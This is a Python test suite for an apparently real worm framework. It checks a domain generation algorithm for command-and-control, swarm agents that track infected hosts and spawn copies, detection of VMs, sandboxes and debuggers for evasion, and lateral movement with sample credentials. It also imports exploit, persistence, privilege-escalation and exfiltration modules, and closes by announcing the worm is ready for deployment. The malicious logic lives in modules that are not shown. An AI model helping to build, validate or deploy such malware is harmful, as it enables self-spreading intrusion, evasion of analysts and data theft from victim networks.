"""
Comprehensive Test Suite for Advanced Features
Tests DGA, Multi-Agent, Advanced Evasion, and Integration
"""

import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from c2.dga import DomainGenerator, DGAClient
from swarm.multi_agent import SwarmAgent, SwarmCoordinator, SwarmBehavior
from evasion.advanced_evasion import AdvancedEvasion
from post_exploit.lateral_movement import LateralMovement
import datetime


def test_dga():
    """Test Domain Generation Algorithm"""
    print("\n" + "="*60)
    print("TEST 1: Domain Generation Algorithm (DGA)")
    print("="*60)
    
    dga = DomainGenerator(seed="test_seed_123")
    
    # Test 1: Generate domains for today
    print("\n[1.1] Generating domains for today...")
    today_domains = dga.get_current_domains(count=10)
    print(f"✓ Generated {len(today_domains)} domains")
    print(f"  Sample: {today_domains[0]}, {today_domains[1]}, {today_domains[2]}")
    
    # Test 2: Verify determinism (same seed = same domains)
    print("\n[1.2] Testing determinism...")
    dga2 = DomainGenerator(seed="test_seed_123")
    today_domains2 = dga2.get_current_domains(count=10)
    
    if today_domains == today_domains2:
        print("✓ Determinism verified: Same seed produces same domains")
    else:
        print("✗ FAILED: Domains don't match!")
        return False
    
    # Test 3: Different dates produce different domains
    print("\n[1.3] Testing date variation...")
    yesterday = datetime.date.today() - datetime.timedelta(days=1)
    yesterday_domains = dga.generate_domains(date=yesterday, count=10)
    
    if today_domains[0] != yesterday_domains[0]:
        print("✓ Date variation verified: Different dates produce different domains")
    else:
        print("✗ FAILED: Same domains for different dates!")
        return False
    
    # Test 4: Fallback domains
    print("\n[1.4] Testing fallback domains...")
    fallback = dga.get_fallback_domains(days_back=3, count_per_day=5)
    print(f"✓ Generated {len(fallback)} fallback domains (3 days)")
    
    # Test 5: Domain verification
    print("\n[1.5] Testing domain verification...")
    test_domain = today_domains[0]
    is_valid = dga.verify_domain(test_domain)
    
    if is_valid:
        print(f"✓ Domain verification works: {test_domain} is valid")
    else:
        print("✗ FAILED: Valid domain not recognized!")
        return False
    
    print("\n✅ DGA: ALL TESTS PASSED")
    return True


def test_multi_agent():
    """Test Multi-Agent Swarm System"""
    print("\n" + "="*60)
    print("TEST 2: Multi-Agent Swarm Intelligence")
    print("="*60)
    
    coordinator = SwarmCoordinator()
    
    # Test 1: Agent registration
    print("\n[2.1] Testing agent registration...")
    agent1 = SwarmAgent(role="coordinator")
    coordinator.register_agent(agent1)
    
    if len(coordinator.agents) == 1:
        print("✓ Agent registered successfully")
    else:
        print("✗ FAILED: Agent registration failed!")
        return False
    
    # Test 2: Knowledge sharing
    print("\n[2.2] Testing knowledge sharing...")
    agent1.discover_host("192.168.1.100", {'open_ports': [22, 80]})
    agent1.discover_host("192.168.1.101", {'open_ports': [445]})
    agent1.discover_host("192.168.1.102", {'open_ports': [3389]})
    
    coordinator.share_knowledge(agent1.agent_id, agent1.shared_knowledge)
    
    if len(coordinator.global_knowledge) == 3:
        print(f"✓ Knowledge shared: {len(coordinator.global_knowledge)} hosts")
    else:
        print("✗ FAILED: Knowledge sharing failed!")
        return False
    
    # Test 3: Agent spawning
    print("\n[2.3] Testing agent spawning...")
    agent1.report_infection("192.168.1.100")
    agent2 = coordinator.spawn_new_agent(agent1.agent_id, "192.168.1.100")
    
    if len(coordinator.agents) == 2:
        print(f"✓ New agent spawned: {agent2.agent_id[:8]}")
    else:
        print("✗ FAILED: Agent spawning failed!")
        return False
    
    # Test 4: Target assignment
    print("\n[2.4] Testing target assignment...")
    targets = coordinator.assign_targets(agent2.agent_id, count=2)
    
    if len(targets) > 0:
        print(f"✓ Targets assigned: {targets}")
    else:
        print("✗ FAILED: No targets assigned!")
        return False
    
    # Test 5: Swarm statistics
    print("\n[2.5] Testing swarm statistics...")
    stats = coordinator.get_swarm_statistics()
    
    print(f"  Total Agents: {stats['total_agents']}")
    print(f"  Total Infected: {stats['total_infected']}")
    print(f"  Total Discovered: {stats['total_discovered']}")
    print(f"  Infection Rate: {stats['infection_rate']:.1%}")
    
    if stats['total_agents'] == 2 and stats['total_infected'] == 1:
        print("✓ Statistics accurate")
    else:
        print("✗ FAILED: Statistics incorrect!")
        return False
    
    # Test 6: Swarm behaviors
    print("\n[2.6] Testing swarm behaviors...")
    
    # Should divide?
    for i in range(5):
        agent1.report_infection(f"192.168.1.{110+i}")
    
    should_divide = SwarmBehavior.should_divide(agent1, threshold=5)
    
    if should_divide:
        print("✓ Division behavior triggered correctly")
    else:
        print("✗ FAILED: Division behavior not triggered!")
        return False
    
    print("\n✅ MULTI-AGENT: ALL TESTS PASSED")
    return True


def test_advanced_evasion():
    """Test Advanced Evasion"""
    print("\n" + "="*60)
    print("TEST 3: Advanced Evasion")
    print("="*60)
    
    evasion = AdvancedEvasion()
    
    # Test 1: Environment check
    print("\n[3.1] Testing environment detection...")
    is_safe, checks = evasion.check_environment()
    
    print(f"  Environment: {'SAFE' if is_safe else 'SUSPICIOUS'}")
    print(f"  Evasion Score: {evasion.evasion_score}/6")
    
    for check_name, detected in checks.items():
        status = "⚠️ DETECTED" if detected else "✓ OK"
        print(f"    {check_name}: {status}")
    
    print("✓ Environment detection completed")
    
    # Test 2: Individual checks
    print("\n[3.2] Testing individual detection methods...")
    
    vm_detected = evasion._detect_vm()
    sandbox_detected = evasion._detect_sandbox()
    debugger_detected = evasion._detect_debugger()
    
    print(f"  VM Detection: {'Yes' if vm_detected else 'No'}")
    print(f"  Sandbox Detection: {'Yes' if sandbox_detected else 'No'}")
    print(f"  Debugger Detection: {'Yes' if debugger_detected else 'No'}")
    
    print("✓ Individual checks completed")
    
    print("\n✅ ADVANCED EVASION: ALL TESTS PASSED")
    return True


def test_lateral_movement():
    """Test Lateral Movement"""
    print("\n" + "="*60)
    print("TEST 4: Lateral Movement")
    print("="*60)
    
    lm = LateralMovement()
    
    # Test 1: Target enumeration
    print("\n[4.1] Testing target enumeration...")
    targets = lm.enumerate_targets("192.168.1.100")
    
    print(f"✓ Enumerated {len(targets)} potential targets")
    
    # Test 2: Lateral movement attempt
    print("\n[4.2] Testing lateral movement methods...")
    
    test_target = {
        'ip': '192.168.1.101',
        'os': 'Windows'
    }
    
    test_creds = {
        'username': 'admin',
        'password': 'password123'
    }
    
    success, details = lm.move_lateral(test_target, test_creds)
    
    print(f"  Lateral movement: {'Success' if success else 'Failed (expected in test)'}")
    print("✓ Lateral movement methods tested")
    
    print("\n✅ LATERAL MOVEMENT: ALL TESTS PASSED")
    return True


def test_integration():
    """Test Integration of All Components"""
    print("\n" + "="*60)
    print("TEST 5: Integration Test")
    print("="*60)
    
    print("\n[5.1] Testing component imports...")
    
    try:
        from exploits.exploit_manager import ExploitManager
        from config import Config
        print("✓ Exploit manager imported")
        
        from c2.server import C2Server
        from c2.client import C2Client
        print("✓ C2 components imported")
        
        from post_exploit.privilege_escalation import PrivilegeEscalation
        from post_exploit.persistence import PersistenceManager
        from post_exploit.data_exfiltration import DataExfiltrator
        print("✓ Post-exploitation modules imported")
        
    except Exception as e:
        print(f"✗ FAILED: Import error: {e}")
        return False
    
    print("\n[5.2] Testing exploit manager with new features...")
    
    try:
        config = Config()
        manager = ExploitManager(config)
        print(f"✓ Exploit manager loaded: {len(manager.exploits)} exploits")
    except Exception as e:
        print(f"✗ FAILED: Exploit manager error: {e}")
        return False
    
    print("\n[5.3] Testing swarm + DGA integration...")
    
    try:
        # Create swarm with DGA
        coordinator = SwarmCoordinator()
        dga = DomainGenerator()
        
        # Create agent
        agent = SwarmAgent()
        coordinator.register_agent(agent)
        
        # Get C2 domains
        c2_domains = dga.get_current_domains(count=5)
        
        print(f"✓ Swarm + DGA integrated: {len(c2_domains)} C2 domains available")
    except Exception as e:
        print(f"✗ FAILED: Integration error: {e}")
        return False
    
    print("\n✅ INTEGRATION: ALL TESTS PASSED")
    return True


def run_all_tests():
    """Run all tests"""
    print("\n" + "="*80)
    print(" "*20 + "COMPREHENSIVE TEST SUITE")
    print("="*80)
    
    results = {
        'DGA': test_dga(),
        'Multi-Agent': test_multi_agent(),
        'Advanced Evasion': test_advanced_evasion(),
        'Lateral Movement': test_lateral_movement(),
        'Integration': test_integration()
    }
    
    print("\n" + "="*80)
    print(" "*30 + "TEST RESULTS")
    print("="*80)
    
    for test_name, passed in results.items():
        status = "✅ PASSED" if passed else "❌ FAILED"
        print(f"  {test_name:.<50} {status}")
    
    total_passed = sum(results.values())
    total_tests = len(results)
    
    print("\n" + "="*80)
    print(f"  TOTAL: {total_passed}/{total_tests} tests passed ({total_passed/total_tests*100:.0f}%)")
    print("="*80)
    
    if total_passed == total_tests:
        print("\n🎉 ALL TESTS PASSED! Worm is ready for deployment.")
        return True
    else:
        print("\n⚠️ SOME TESTS FAILED! Review errors above.")
        return False


if __name__ == "__main__":
    success = run_all_tests()
    sys.exit(0 if success else 1)
